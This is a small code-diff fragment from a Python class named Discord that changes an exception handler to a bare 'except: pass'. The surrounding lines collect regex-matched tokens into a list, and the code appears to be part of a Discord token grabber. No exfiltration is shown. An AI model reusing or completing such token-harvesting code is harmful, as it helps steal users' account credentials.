@@ -34,7 +34,7 @@ class Discord():
 						if regex:
 							for token in regex:
 								self.tokens.append(token)
-		except Exception as e:
+		except:
 			pass
 
 	def neatify(self):
